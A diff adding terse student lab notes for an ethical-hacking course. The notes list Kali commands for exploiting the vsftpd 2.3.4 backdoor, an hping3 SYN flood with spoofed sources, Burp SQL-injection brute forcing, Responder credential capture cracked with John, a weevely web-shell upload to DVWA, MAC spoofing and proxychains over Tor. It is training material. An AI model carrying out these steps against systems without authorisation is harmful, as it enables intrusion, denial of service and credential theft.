@@ -1,0 +1,113 @@
+1a dnmap
+ping 192.168.56.101
+nmap -sV 192.168.56.101
+searchsploit vsftpd 2.3.4
+Open a new terminal:
+sudo su
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+show info
+show options
+set RHOSTS 192.168.56.101
+exploit
+pwd
+whoami
+ls
+mkdir hack
+rmdir hack
+
+1b Hpin3
+Open whireshark-eth0
+Hping3
+sudo apt install hping3
+hping3 -c 15000 -d 120 -S  -p 80 --flood --rand-source 192.168.1.59
+
+
+2a. Burpsuit
+Open meta
+Cd /var/www/mutillidae
+Sudo nano config.inc
+Change dbname to “owasp10”
+O X
+Copy meta IP
+Open kali
+Open meta IP
+Select mutillidae-10-injec-userinfo
+Change preference to manual
+Type 127.0.0.1 and port 8080
+Check the box
+Open burpsuit
+Start-proxy
+Enter usename and password in browser
+Abc abc
+Select right click-send to intruder
+Go to intruder-pos-clear
+Select abc-add
+Select payload-load
+Path-root-users-share-wordlist-wz-injections-sql.txt
+Start attack
+39-response-renderer
+2b httrack
+Httrack <url>
+
+
+
+4(a) Macchanger
+macchanger -s eth0
+ifconfig eth0 down
+macchanger -r eth0
+ifconfig eth0 down
+macchanger -s eth0
+macchanger -e eth0
+macchanger -m b2:aa:0e:56:ed:f7 eth0
+macchanger -p eth0
+
+4b. responder
+responder -I eth0 
+Enter the IP address and enter the credentials(uname and pw)
+Go to /usr/share/responder/logs and copy the file name (HTTP......) 
+Run it with john to get the credentials
+
+
+
+
+
+
+
+
+5a. Weevly
+In kali type
+Weevely generate 12345 shell.php
+Open meta
+get the IP Adress
+back to kali
+open browser and type mata IP
+select-dvw-enter credentials
+dvwa security change to low
+go to upload n upload shell.php, copy the path from "hackable" and paste after dvwa/
+copy the entire url and enter this in the terminal: weevely "paste url here" 12345
+System_info
+5b. Proxychain
+Open browser type dns leak test
+cd /etc
+install tor
+service tor start
+service tor status
+ls
+sudo nano proxychains4.conf
+comment strict chain
+uncomment dubamic
+change to 5
+ctrl+o enter ctrl+X
+service tor restart
+proxychain4 firefox www.google.com enter open dns leak test
+
+7(a) Pipal
+-create a txt file in pwd full of passwords
+-run "pipal pass.txt" to get stats
+-pipal -t 10 pass.txt
+-pipal -o "filename" pass.txt
+
+7(b) Cutycapt
+cutycapt -url=https://www.rvce.edu.in --out=outt.png
